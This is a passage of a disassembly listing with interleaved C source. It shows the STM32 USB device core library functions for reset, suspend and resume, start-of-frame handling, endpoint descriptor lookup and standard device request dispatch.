 800b2d6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b2da:	695b      	ldr	r3, [r3, #20]
 800b2dc:	7afa      	ldrb	r2, [r7, #11]
 800b2de:	4611      	mov	r1, r2
 800b2e0:	68f8      	ldr	r0, [r7, #12]
 800b2e2:	4798      	blx	r3
 800b2e4:	4603      	mov	r3, r0
 800b2e6:	75bb      	strb	r3, [r7, #22]

          if (ret != USBD_OK)
 800b2e8:	7dbb      	ldrb	r3, [r7, #22]
 800b2ea:	2b00      	cmp	r3, #0
 800b2ec:	d001      	beq.n	800b2f2 <USBD_LL_DataInStage+0x15a>
          {
            return ret;
 800b2ee:	7dbb      	ldrb	r3, [r7, #22]
 800b2f0:	e000      	b.n	800b2f4 <USBD_LL_DataInStage+0x15c>
        }
      }
    }
  }

  return USBD_OK;
 800b2f2:	2300      	movs	r3, #0
}
 800b2f4:	4618      	mov	r0, r3
 800b2f6:	3718      	adds	r7, #24
 800b2f8:	46bd      	mov	sp, r7
 800b2fa:	bd80      	pop	{r7, pc}

0800b2fc <USBD_LL_Reset>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Reset(USBD_HandleTypeDef *pdev)
{
 800b2fc:	b580      	push	{r7, lr}
 800b2fe:	b084      	sub	sp, #16
 800b300:	af00      	add	r7, sp, #0
 800b302:	6078      	str	r0, [r7, #4]
  USBD_StatusTypeDef ret = USBD_OK;
 800b304:	2300      	movs	r3, #0
 800b306:	73fb      	strb	r3, [r7, #15]

  /* Upon Reset call user call back */
  pdev->dev_state = USBD_STATE_DEFAULT;
 800b308:	687b      	ldr	r3, [r7, #4]
 800b30a:	2201      	movs	r2, #1
 800b30c:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  pdev->ep0_state = USBD_EP0_IDLE;
 800b310:	687b      	ldr	r3, [r7, #4]
 800b312:	2200      	movs	r2, #0
 800b314:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->dev_config = 0U;
 800b318:	687b      	ldr	r3, [r7, #4]
 800b31a:	2200      	movs	r2, #0
 800b31c:	605a      	str	r2, [r3, #4]
  pdev->dev_remote_wakeup = 0U;
 800b31e:	687b      	ldr	r3, [r7, #4]
 800b320:	2200      	movs	r2, #0
 800b322:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
  pdev->dev_test_mode = 0U;
 800b326:	687b      	ldr	r3, [r7, #4]
 800b328:	2200      	movs	r2, #0
 800b32a:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
      }
    }
  }
#else

  if (pdev->pClass[0] != NULL)
 800b32e:	687b      	ldr	r3, [r7, #4]
 800b330:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b334:	2b00      	cmp	r3, #0
 800b336:	d014      	beq.n	800b362 <USBD_LL_Reset+0x66>
  {
    if (pdev->pClass[0]->DeInit != NULL)
 800b338:	687b      	ldr	r3, [r7, #4]
 800b33a:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b33e:	685b      	ldr	r3, [r3, #4]
 800b340:	2b00      	cmp	r3, #0
 800b342:	d00e      	beq.n	800b362 <USBD_LL_Reset+0x66>
    {
      if (pdev->pClass[0]->DeInit(pdev, (uint8_t)pdev->dev_config) != USBD_OK)
 800b344:	687b      	ldr	r3, [r7, #4]
 800b346:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b34a:	685b      	ldr	r3, [r3, #4]
 800b34c:	687a      	ldr	r2, [r7, #4]
 800b34e:	6852      	ldr	r2, [r2, #4]
 800b350:	b2d2      	uxtb	r2, r2
 800b352:	4611      	mov	r1, r2
 800b354:	6878      	ldr	r0, [r7, #4]
 800b356:	4798      	blx	r3
 800b358:	4603      	mov	r3, r0
 800b35a:	2b00      	cmp	r3, #0
 800b35c:	d001      	beq.n	800b362 <USBD_LL_Reset+0x66>
      {
        ret = USBD_FAIL;
 800b35e:	2303      	movs	r3, #3
 800b360:	73fb      	strb	r3, [r7, #15]
    }
  }
#endif /* USE_USBD_COMPOSITE */

  /* Open EP0 OUT */
  (void)USBD_LL_OpenEP(pdev, 0x00U, USBD_EP_TYPE_CTRL, USB_MAX_EP0_SIZE);
 800b362:	2340      	movs	r3, #64	; 0x40
 800b364:	2200      	movs	r2, #0
 800b366:	2100      	movs	r1, #0
 800b368:	6878      	ldr	r0, [r7, #4]
 800b36a:	f001 fbc3 	bl	800caf4 <USBD_LL_OpenEP>
  pdev->ep_out[0x00U & 0xFU].is_used = 1U;
 800b36e:	687b      	ldr	r3, [r7, #4]
 800b370:	2201      	movs	r2, #1
 800b372:	f8a3 2164 	strh.w	r2, [r3, #356]	; 0x164

  pdev->ep_out[0].maxpacket = USB_MAX_EP0_SIZE;
 800b376:	687b      	ldr	r3, [r7, #4]
 800b378:	2240      	movs	r2, #64	; 0x40
 800b37a:	f8c3 2160 	str.w	r2, [r3, #352]	; 0x160

  /* Open EP0 IN */
  (void)USBD_LL_OpenEP(pdev, 0x80U, USBD_EP_TYPE_CTRL, USB_MAX_EP0_SIZE);
 800b37e:	2340      	movs	r3, #64	; 0x40
 800b380:	2200      	movs	r2, #0
 800b382:	2180      	movs	r1, #128	; 0x80
 800b384:	6878      	ldr	r0, [r7, #4]
 800b386:	f001 fbb5 	bl	800caf4 <USBD_LL_OpenEP>
  pdev->ep_in[0x80U & 0xFU].is_used = 1U;
 800b38a:	687b      	ldr	r3, [r7, #4]
 800b38c:	2201      	movs	r2, #1
 800b38e:	849a      	strh	r2, [r3, #36]	; 0x24

  pdev->ep_in[0].maxpacket = USB_MAX_EP0_SIZE;
 800b390:	687b      	ldr	r3, [r7, #4]
 800b392:	2240      	movs	r2, #64	; 0x40
 800b394:	621a      	str	r2, [r3, #32]

  return ret;
 800b396:	7bfb      	ldrb	r3, [r7, #15]
}
 800b398:	4618      	mov	r0, r3
 800b39a:	3710      	adds	r7, #16
 800b39c:	46bd      	mov	sp, r7
 800b39e:	bd80      	pop	{r7, pc}

0800b3a0 <USBD_LL_SetSpeed>:
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_SetSpeed(USBD_HandleTypeDef *pdev,
                                    USBD_SpeedTypeDef speed)
{
 800b3a0:	b480      	push	{r7}
 800b3a2:	b083      	sub	sp, #12
 800b3a4:	af00      	add	r7, sp, #0
 800b3a6:	6078      	str	r0, [r7, #4]
 800b3a8:	460b      	mov	r3, r1
 800b3aa:	70fb      	strb	r3, [r7, #3]
  pdev->dev_speed = speed;
 800b3ac:	687b      	ldr	r3, [r7, #4]
 800b3ae:	78fa      	ldrb	r2, [r7, #3]
 800b3b0:	741a      	strb	r2, [r3, #16]

  return USBD_OK;
 800b3b2:	2300      	movs	r3, #0
}
 800b3b4:	4618      	mov	r0, r3
 800b3b6:	370c      	adds	r7, #12
 800b3b8:	46bd      	mov	sp, r7
 800b3ba:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b3be:	4770      	bx	lr

0800b3c0 <USBD_LL_Suspend>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Suspend(USBD_HandleTypeDef *pdev)
{
 800b3c0:	b480      	push	{r7}
 800b3c2:	b083      	sub	sp, #12
 800b3c4:	af00      	add	r7, sp, #0
 800b3c6:	6078      	str	r0, [r7, #4]
  if (pdev->dev_state != USBD_STATE_SUSPENDED)
 800b3c8:	687b      	ldr	r3, [r7, #4]
 800b3ca:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b3ce:	b2db      	uxtb	r3, r3
 800b3d0:	2b04      	cmp	r3, #4
 800b3d2:	d006      	beq.n	800b3e2 <USBD_LL_Suspend+0x22>
  {
    pdev->dev_old_state = pdev->dev_state;
 800b3d4:	687b      	ldr	r3, [r7, #4]
 800b3d6:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b3da:	b2da      	uxtb	r2, r3
 800b3dc:	687b      	ldr	r3, [r7, #4]
 800b3de:	f883 229d 	strb.w	r2, [r3, #669]	; 0x29d
  }

  pdev->dev_state = USBD_STATE_SUSPENDED;
 800b3e2:	687b      	ldr	r3, [r7, #4]
 800b3e4:	2204      	movs	r2, #4
 800b3e6:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c

  return USBD_OK;
 800b3ea:	2300      	movs	r3, #0
}
 800b3ec:	4618      	mov	r0, r3
 800b3ee:	370c      	adds	r7, #12
 800b3f0:	46bd      	mov	sp, r7
 800b3f2:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b3f6:	4770      	bx	lr

0800b3f8 <USBD_LL_Resume>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Resume(USBD_HandleTypeDef *pdev)
{
 800b3f8:	b480      	push	{r7}
 800b3fa:	b083      	sub	sp, #12
 800b3fc:	af00      	add	r7, sp, #0
 800b3fe:	6078      	str	r0, [r7, #4]
  if (pdev->dev_state == USBD_STATE_SUSPENDED)
 800b400:	687b      	ldr	r3, [r7, #4]
 800b402:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b406:	b2db      	uxtb	r3, r3
 800b408:	2b04      	cmp	r3, #4
 800b40a:	d106      	bne.n	800b41a <USBD_LL_Resume+0x22>
  {
    pdev->dev_state = pdev->dev_old_state;
 800b40c:	687b      	ldr	r3, [r7, #4]
 800b40e:	f893 329d 	ldrb.w	r3, [r3, #669]	; 0x29d
 800b412:	b2da      	uxtb	r2, r3
 800b414:	687b      	ldr	r3, [r7, #4]
 800b416:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  }

  return USBD_OK;
 800b41a:	2300      	movs	r3, #0
}
 800b41c:	4618      	mov	r0, r3
 800b41e:	370c      	adds	r7, #12
 800b420:	46bd      	mov	sp, r7
 800b422:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b426:	4770      	bx	lr

0800b428 <USBD_LL_SOF>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_SOF(USBD_HandleTypeDef *pdev)
{
 800b428:	b580      	push	{r7, lr}
 800b42a:	b082      	sub	sp, #8
 800b42c:	af00      	add	r7, sp, #0
 800b42e:	6078      	str	r0, [r7, #4]
  /* The SOF event can be distributed for all classes that support it */
  if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b430:	687b      	ldr	r3, [r7, #4]
 800b432:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b436:	b2db      	uxtb	r3, r3
 800b438:	2b03      	cmp	r3, #3
 800b43a:	d110      	bne.n	800b45e <USBD_LL_SOF+0x36>
          }
        }
      }
    }
#else
    if (pdev->pClass[0] != NULL)
 800b43c:	687b      	ldr	r3, [r7, #4]
 800b43e:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b442:	2b00      	cmp	r3, #0
 800b444:	d00b      	beq.n	800b45e <USBD_LL_SOF+0x36>
    {
      if (pdev->pClass[0]->SOF != NULL)
 800b446:	687b      	ldr	r3, [r7, #4]
 800b448:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b44c:	69db      	ldr	r3, [r3, #28]
 800b44e:	2b00      	cmp	r3, #0
 800b450:	d005      	beq.n	800b45e <USBD_LL_SOF+0x36>
      {
        (void)pdev->pClass[0]->SOF(pdev);
 800b452:	687b      	ldr	r3, [r7, #4]
 800b454:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b458:	69db      	ldr	r3, [r3, #28]
 800b45a:	6878      	ldr	r0, [r7, #4]
 800b45c:	4798      	blx	r3
      }
    }
#endif /* USE_USBD_COMPOSITE */
  }

  return USBD_OK;
 800b45e:	2300      	movs	r3, #0
}
 800b460:	4618      	mov	r0, r3
 800b462:	3708      	adds	r7, #8
 800b464:	46bd      	mov	sp, r7
 800b466:	bd80      	pop	{r7, pc}

0800b468 <USBD_CoreFindIF>:
  * @param  pdev: device instance
  * @param  index : selected interface number
  * @retval index of the class using the selected interface number. OxFF if no class found.
  */
uint8_t USBD_CoreFindIF(USBD_HandleTypeDef *pdev, uint8_t index)
{
 800b468:	b480      	push	{r7}
 800b46a:	b083      	sub	sp, #12
 800b46c:	af00      	add	r7, sp, #0
 800b46e:	6078      	str	r0, [r7, #4]
 800b470:	460b      	mov	r3, r1
 800b472:	70fb      	strb	r3, [r7, #3]
  return 0xFFU;
#else
  UNUSED(pdev);
  UNUSED(index);

  return 0x00U;
 800b474:	2300      	movs	r3, #0
#endif /* USE_USBD_COMPOSITE */
}
 800b476:	4618      	mov	r0, r3
 800b478:	370c      	adds	r7, #12
 800b47a:	46bd      	mov	sp, r7
 800b47c:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b480:	4770      	bx	lr

0800b482 <USBD_CoreFindEP>:
  * @param  pdev: device instance
  * @param  index : selected endpoint number
  * @retval index of the class using the selected endpoint number. 0xFF if no class found.
  */
uint8_t USBD_CoreFindEP(USBD_HandleTypeDef *pdev, uint8_t index)
{
 800b482:	b480      	push	{r7}
 800b484:	b083      	sub	sp, #12
 800b486:	af00      	add	r7, sp, #0
 800b488:	6078      	str	r0, [r7, #4]
 800b48a:	460b      	mov	r3, r1
 800b48c:	70fb      	strb	r3, [r7, #3]
  return 0xFFU;
#else
  UNUSED(pdev);
  UNUSED(index);

  return 0x00U;
 800b48e:	2300      	movs	r3, #0
#endif /* USE_USBD_COMPOSITE */
}
 800b490:	4618      	mov	r0, r3
 800b492:	370c      	adds	r7, #12
 800b494:	46bd      	mov	sp, r7
 800b496:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b49a:	4770      	bx	lr

0800b49c <USBD_GetEpDesc>:
  * @param  pConfDesc:  pointer to Bos descriptor
  * @param  EpAddr:  endpoint address
  * @retval pointer to video endpoint descriptor
  */
void *USBD_GetEpDesc(uint8_t *pConfDesc, uint8_t EpAddr)
{
 800b49c:	b580      	push	{r7, lr}
 800b49e:	b086      	sub	sp, #24
 800b4a0:	af00      	add	r7, sp, #0
 800b4a2:	6078      	str	r0, [r7, #4]
 800b4a4:	460b      	mov	r3, r1
 800b4a6:	70fb      	strb	r3, [r7, #3]
  USBD_DescHeaderTypeDef *pdesc = (USBD_DescHeaderTypeDef *)(void *)pConfDesc;
 800b4a8:	687b      	ldr	r3, [r7, #4]
 800b4aa:	617b      	str	r3, [r7, #20]
  USBD_ConfigDescTypeDef *desc = (USBD_ConfigDescTypeDef *)(void *)pConfDesc;
 800b4ac:	687b      	ldr	r3, [r7, #4]
 800b4ae:	60fb      	str	r3, [r7, #12]
  USBD_EpDescTypeDef *pEpDesc = NULL;
 800b4b0:	2300      	movs	r3, #0
 800b4b2:	613b      	str	r3, [r7, #16]
  uint16_t ptr;

  if (desc->wTotalLength > desc->bLength)
 800b4b4:	68fb      	ldr	r3, [r7, #12]
 800b4b6:	885b      	ldrh	r3, [r3, #2]
 800b4b8:	b29a      	uxth	r2, r3
 800b4ba:	68fb      	ldr	r3, [r7, #12]
 800b4bc:	781b      	ldrb	r3, [r3, #0]
 800b4be:	b29b      	uxth	r3, r3
 800b4c0:	429a      	cmp	r2, r3
 800b4c2:	d920      	bls.n	800b506 <USBD_GetEpDesc+0x6a>
  {
    ptr = desc->bLength;
 800b4c4:	68fb      	ldr	r3, [r7, #12]
 800b4c6:	781b      	ldrb	r3, [r3, #0]
 800b4c8:	b29b      	uxth	r3, r3
 800b4ca:	817b      	strh	r3, [r7, #10]

    while (ptr < desc->wTotalLength)
 800b4cc:	e013      	b.n	800b4f6 <USBD_GetEpDesc+0x5a>
    {
      pdesc = USBD_GetNextDesc((uint8_t *)pdesc, &ptr);
 800b4ce:	f107 030a 	add.w	r3, r7, #10
 800b4d2:	4619      	mov	r1, r3
 800b4d4:	6978      	ldr	r0, [r7, #20]
 800b4d6:	f000 f81b 	bl	800b510 <USBD_GetNextDesc>
 800b4da:	6178      	str	r0, [r7, #20]

      if (pdesc->bDescriptorType == USB_DESC_TYPE_ENDPOINT)
 800b4dc:	697b      	ldr	r3, [r7, #20]
 800b4de:	785b      	ldrb	r3, [r3, #1]
 800b4e0:	2b05      	cmp	r3, #5
 800b4e2:	d108      	bne.n	800b4f6 <USBD_GetEpDesc+0x5a>
      {
        pEpDesc = (USBD_EpDescTypeDef *)(void *)pdesc;
 800b4e4:	697b      	ldr	r3, [r7, #20]
 800b4e6:	613b      	str	r3, [r7, #16]

        if (pEpDesc->bEndpointAddress == EpAddr)
 800b4e8:	693b      	ldr	r3, [r7, #16]
 800b4ea:	789b      	ldrb	r3, [r3, #2]
 800b4ec:	78fa      	ldrb	r2, [r7, #3]
 800b4ee:	429a      	cmp	r2, r3
 800b4f0:	d008      	beq.n	800b504 <USBD_GetEpDesc+0x68>
        {
          break;
        }
        else
        {
          pEpDesc = NULL;
 800b4f2:	2300      	movs	r3, #0
 800b4f4:	613b      	str	r3, [r7, #16]
    while (ptr < desc->wTotalLength)
 800b4f6:	68fb      	ldr	r3, [r7, #12]
 800b4f8:	885b      	ldrh	r3, [r3, #2]
 800b4fa:	b29a      	uxth	r2, r3
 800b4fc:	897b      	ldrh	r3, [r7, #10]
 800b4fe:	429a      	cmp	r2, r3
 800b500:	d8e5      	bhi.n	800b4ce <USBD_GetEpDesc+0x32>
 800b502:	e000      	b.n	800b506 <USBD_GetEpDesc+0x6a>
          break;
 800b504:	bf00      	nop
        }
      }
    }
  }

  return (void *)pEpDesc;
 800b506:	693b      	ldr	r3, [r7, #16]
}
 800b508:	4618      	mov	r0, r3
 800b50a:	3718      	adds	r7, #24
 800b50c:	46bd      	mov	sp, r7
 800b50e:	bd80      	pop	{r7, pc}

0800b510 <USBD_GetNextDesc>:
  * @param  buf: Buffer where the descriptor is available
  * @param  ptr: data pointer inside the descriptor
  * @retval next header
  */
USBD_DescHeaderTypeDef *USBD_GetNextDesc(uint8_t *pbuf, uint16_t *ptr)
{
 800b510:	b480      	push	{r7}
 800b512:	b085      	sub	sp, #20
 800b514:	af00      	add	r7, sp, #0
 800b516:	6078      	str	r0, [r7, #4]
 800b518:	6039      	str	r1, [r7, #0]
  USBD_DescHeaderTypeDef *pnext = (USBD_DescHeaderTypeDef *)(void *)pbuf;
 800b51a:	687b      	ldr	r3, [r7, #4]
 800b51c:	60fb      	str	r3, [r7, #12]

  *ptr += pnext->bLength;
 800b51e:	683b      	ldr	r3, [r7, #0]
 800b520:	881a      	ldrh	r2, [r3, #0]
 800b522:	68fb      	ldr	r3, [r7, #12]
 800b524:	781b      	ldrb	r3, [r3, #0]
 800b526:	b29b      	uxth	r3, r3
 800b528:	4413      	add	r3, r2
 800b52a:	b29a      	uxth	r2, r3
 800b52c:	683b      	ldr	r3, [r7, #0]
 800b52e:	801a      	strh	r2, [r3, #0]
  pnext = (USBD_DescHeaderTypeDef *)(void *)(pbuf + pnext->bLength);
 800b530:	68fb      	ldr	r3, [r7, #12]
 800b532:	781b      	ldrb	r3, [r3, #0]
 800b534:	461a      	mov	r2, r3
 800b536:	687b      	ldr	r3, [r7, #4]
 800b538:	4413      	add	r3, r2
 800b53a:	60fb      	str	r3, [r7, #12]

  return (pnext);
 800b53c:	68fb      	ldr	r3, [r7, #12]
}
 800b53e:	4618      	mov	r0, r3
 800b540:	3714      	adds	r7, #20
 800b542:	46bd      	mov	sp, r7
 800b544:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b548:	4770      	bx	lr

0800b54a <SWAPBYTE>:

/** @defgroup USBD_DEF_Exported_Macros
  * @{
  */
__STATIC_INLINE uint16_t SWAPBYTE(uint8_t *addr)
{
 800b54a:	b480      	push	{r7}
 800b54c:	b087      	sub	sp, #28
 800b54e:	af00      	add	r7, sp, #0
 800b550:	6078      	str	r0, [r7, #4]
  uint16_t _SwapVal;
  uint16_t _Byte1;
  uint16_t _Byte2;
  uint8_t *_pbuff = addr;
 800b552:	687b      	ldr	r3, [r7, #4]
 800b554:	617b      	str	r3, [r7, #20]

  _Byte1 = *(uint8_t *)_pbuff;
 800b556:	697b      	ldr	r3, [r7, #20]
 800b558:	781b      	ldrb	r3, [r3, #0]
 800b55a:	827b      	strh	r3, [r7, #18]
  _pbuff++;
 800b55c:	697b      	ldr	r3, [r7, #20]
 800b55e:	3301      	adds	r3, #1
 800b560:	617b      	str	r3, [r7, #20]
  _Byte2 = *(uint8_t *)_pbuff;
 800b562:	697b      	ldr	r3, [r7, #20]
 800b564:	781b      	ldrb	r3, [r3, #0]
 800b566:	823b      	strh	r3, [r7, #16]

  _SwapVal = (_Byte2 << 8) | _Byte1;
 800b568:	8a3b      	ldrh	r3, [r7, #16]
 800b56a:	021b      	lsls	r3, r3, #8
 800b56c:	b21a      	sxth	r2, r3
 800b56e:	f9b7 3012 	ldrsh.w	r3, [r7, #18]
 800b572:	4313      	orrs	r3, r2
 800b574:	b21b      	sxth	r3, r3
 800b576:	81fb      	strh	r3, [r7, #14]

  return _SwapVal;
 800b578:	89fb      	ldrh	r3, [r7, #14]
}
 800b57a:	4618      	mov	r0, r3
 800b57c:	371c      	adds	r7, #28
 800b57e:	46bd      	mov	sp, r7
 800b580:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b584:	4770      	bx	lr
	...

0800b588 <USBD_StdDevReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdDevReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b588:	b580      	push	{r7, lr}
 800b58a:	b084      	sub	sp, #16
 800b58c:	af00      	add	r7, sp, #0
 800b58e:	6078      	str	r0, [r7, #4]
 800b590:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800b592:	2300      	movs	r3, #0
 800b594:	73fb      	strb	r3, [r7, #15]

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b596:	683b      	ldr	r3, [r7, #0]
 800b598:	781b      	ldrb	r3, [r3, #0]
 800b59a:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b59e:	2b40      	cmp	r3, #64	; 0x40
 800b5a0:	d005      	beq.n	800b5ae <USBD_StdDevReq+0x26>
 800b5a2:	2b40      	cmp	r3, #64	; 0x40
 800b5a4:	d857      	bhi.n	800b656 <USBD_StdDevReq+0xce>
 800b5a6:	2b00      	cmp	r3, #0
 800b5a8:	d00f      	beq.n	800b5ca <USBD_StdDevReq+0x42>
 800b5aa:	2b20      	cmp	r3, #32
 800b5ac:	d153      	bne.n	800b656 <USBD_StdDevReq+0xce>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
      ret = (USBD_StatusTypeDef)pdev->pClass[pdev->classId]->Setup(pdev, req);
 800b5ae:	687b      	ldr	r3, [r7, #4]
 800b5b0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800b5b4:	687b      	ldr	r3, [r7, #4]
 800b5b6:	32ae      	adds	r2, #174	; 0xae
 800b5b8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b5bc:	689b      	ldr	r3, [r3, #8]
 800b5be:	6839      	ldr	r1, [r7, #0]
 800b5c0:	6878      	ldr	r0, [r7, #4]
 800b5c2:	4798      	blx	r3
 800b5c4:	4603      	mov	r3, r0
 800b5c6:	73fb      	strb	r3, [r7, #15]
      break;
 800b5c8:	e04a      	b.n	800b660 <USBD_StdDevReq+0xd8>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 800b5ca:	683b      	ldr	r3, [r7, #0]
 800b5cc:	785b      	ldrb	r3, [r3, #1]
 800b5ce:	2b09      	cmp	r3, #9
 800b5d0:	d83b      	bhi.n	800b64a <USBD_StdDevReq+0xc2>
 800b5d2:	a201      	add	r2, pc, #4	; (adr r2, 800b5d8 <USBD_StdDevReq+0x50>)
 800b5d4:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800b5d8:	0800b62d 	.word	0x0800b62d
 800b5dc:	0800b641 	.word	0x0800b641
 800b5e0:	0800b64b 	.word	0x0800b64b
 800b5e4:	0800b637 	.word	0x0800b637
 800b5e8:	0800b64b 	.word	0x0800b64b
 800b5ec:	0800b60b 	.word	0x0800b60b
 800b5f0:	0800b601 	.word	0x0800b601
 800b5f4:	0800b64b 	.word	0x0800b64b
 800b5f8:	0800b623 	.word	0x0800b623
 800b5fc:	0800b615 	.word	0x0800b615
      {
        case USB_REQ_GET_DESCRIPTOR:
          USBD_GetDescriptor(pdev, req);
 800b600:	6839      	ldr	r1, [r7, #0]
 800b602:	6878      	ldr	r0, [r7, #4]
 800b604:	f000 fa3c 	bl	800ba80 <USBD_GetDescriptor>
          break;
 800b608:	e024      	b.n	800b654 <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_ADDRESS:
          USBD_SetAddress(pdev, req);
 800b60a:	6839      	ldr	r1, [r7, #0]
 800b60c:	6878      	ldr	r0, [r7, #4]
 800b60e:	f000 fbcb 	bl	800bda8 <USBD_SetAddress>
          break;
 800b612:	e01f      	b.n	800b654 <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_CONFIGURATION:
          ret = USBD_SetConfig(pdev, req);
 800b614:	6839      	ldr	r1, [r7, #0]
 800b616:	6878      	ldr	r0, [r7, #4]
 800b618:	f000 fc0a 	bl	800be30 <USBD_SetConfig>
 800b61c:	4603      	mov	r3, r0
 800b61e:	73fb      	strb	r3, [r7, #15]
          break;
 800b620:	e018      	b.n	800b654 <USBD_StdDevReq+0xcc>

        case USB_REQ_GET_CONFIGURATION:
          USBD_GetConfig(pdev, req);
 800b622:	6839      	ldr	r1, [r7, #0]
 800b624:	6878      	ldr	r0, [r7, #4]
 800b626:	f000 fcad 	bl	800bf84 <USBD_GetConfig>
          break;
 800b62a:	e013      	b.n	800b654 <USBD_StdDevReq+0xcc>

        case USB_REQ_GET_STATUS:
          USBD_GetStatus(pdev, req);
 800b62c:	6839      	ldr	r1, [r7, #0]
 800b62e:	6878      	ldr	r0, [r7, #4]
 800b630:	f000 fcde 	bl	800bff0 <USBD_GetStatus>
          break;
 800b634:	e00e      	b.n	800b654 <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_FEATURE:
          USBD_SetFeature(pdev, req);
 800b636:	6839      	ldr	r1, [r7, #0]
 800b638:	6878      	ldr	r0, [r7, #4]
 800b63a:	f000 fd0d 	bl	800c058 <USBD_SetFeature>
          break;
 800b63e:	e009      	b.n	800b654 <USBD_StdDevReq+0xcc>

        case USB_REQ_CLEAR_FEATURE:
          USBD_ClrFeature(pdev, req);
 800b640:	6839      	ldr	r1, [r7, #0]
 800b642:	6878      	ldr	r0, [r7, #4]
 800b644:	f000 fd31 	bl	800c0aa <USBD_ClrFeature>
          break;
 800b648:	e004      	b.n	800b654 <USBD_StdDevReq+0xcc>

        default:
          USBD_CtlError(pdev, req);
 800b64a:	6839      	ldr	r1, [r7, #0]
 800b64c:	6878      	ldr	r0, [r7, #4]
 800b64e:	f000 fd88 	bl	800c162 <USBD_CtlError>
          break;
 800b652:	bf00      	nop
      }
      break;
 800b654:	e004      	b.n	800b660 <USBD_StdDevReq+0xd8>

    default:
      USBD_CtlError(pdev, req);
 800b656:	6839      	ldr	r1, [r7, #0]
 800b658:	6878      	ldr	r0, [r7, #4]
 800b65a:	f000 fd82 	bl	800c162 <USBD_CtlError>
      break;
 800b65e:	bf00      	nop
  }

  return ret;
 800b660:	7bfb      	ldrb	r3, [r7, #15]
}
 800b662:	4618      	mov	r0, r3
 800b664:	3710      	adds	r7, #16
 800b666:	46bd      	mov	sp, r7
 800b668:	bd80      	pop	{r7, pc}
 800b66a:	bf00      	nop

0800b66c <USBD_StdItfReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdItfReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b66c:	b580      	push	{r7, lr}
 800b66e:	b084      	sub	sp, #16
 800b670:	af00      	add	r7, sp, #0
 800b672:	6078      	str	r0, [r7, #4]
 800b674:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800b676:	2300      	movs	r3, #0
 800b678:	73fb      	strb	r3, [r7, #15]
  uint8_t idx;

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b67a:	683b      	ldr	r3, [r7, #0]
 800b67c:	781b      	ldrb	r3, [r3, #0]
 800b67e:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b682:	2b40      	cmp	r3, #64	; 0x40
 800b684:	d005      	beq.n	800b692 <USBD_StdItfReq+0x26>
 800b686:	2b40      	cmp	r3, #64	; 0x40
 800b688:	d852      	bhi.n	800b730 <USBD_StdItfReq+0xc4>
 800b68a:	2b00      	cmp	r3, #0
 800b68c:	d001      	beq.n	800b692 <USBD_StdItfReq+0x26>
 800b68e:	2b20      	cmp	r3, #32
 800b690:	d14e      	bne.n	800b730 <USBD_StdItfReq+0xc4>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
    case USB_REQ_TYPE_STANDARD:
      switch (pdev->dev_state)
 800b692:	687b      	ldr	r3, [r7, #4]
 800b694:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b698:	b2db      	uxtb	r3, r3
 800b69a:	3b01      	subs	r3, #1
 800b69c:	2b02      	cmp	r3, #2
 800b69e:	d840      	bhi.n	800b722 <USBD_StdItfReq+0xb6>
      {
        case USBD_STATE_DEFAULT:
        case USBD_STATE_ADDRESSED:
        case USBD_STATE_CONFIGURED:

          if (LOBYTE(req->wIndex) <= USBD_MAX_NUM_INTERFACES)
 800b6a0:	683b      	ldr	r3, [r7, #0]
 800b6a2:	889b      	ldrh	r3, [r3, #4]
